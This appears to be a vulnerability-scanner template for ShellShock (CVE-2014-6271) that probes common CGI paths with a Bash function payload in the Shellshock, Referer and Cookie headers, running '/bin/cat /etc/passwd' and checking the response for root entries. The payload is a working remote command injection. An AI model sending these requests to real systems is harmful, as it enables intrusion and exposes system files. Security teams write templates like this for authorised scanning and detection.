id: CVE-2014-6271

info:
  name: ShellShock - Remote Code Execution
  author: neal1991
  severity: critical
  description: |
    ShellShock is a security vulnerability in the Bash shell that allows remote attackers to execute arbitrary commands on a vulnerable system.
    This vulnerability exists in Bash versions 4.3 and earlier.
  reference:
    - https://www.qualys.com/2014/09/24/bash-shebang-remote-code-execution-vulnerability/bash-shebang-remote-code-execution-vulnerability.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
    - https://nvd.nist.gov/vuln/detail/CVE-2014-7169
    - http://www.kb.cert.org/vuls/id/252743
    - http://www.us-cert.gov/ncas/alerts/TA14-268A
    - http://advisories.mageia.org/MGASA-2014-0388.html
  tags: cve,cve2014,rce,shellshock
  created: 2023/07/13

rules:
  r0:
    stop_if_match: true
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      p:
        - /
        - /cgi-bin/status
        - /cgi-bin/stats
        - /cgi-bin/test
        - /cgi-bin/status/status.cgi
        - /test.cgi
        - /debug.cgi
        - /cgi-bin/test-cgi
    request:
      method: GET
      path: "{{p}}"
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
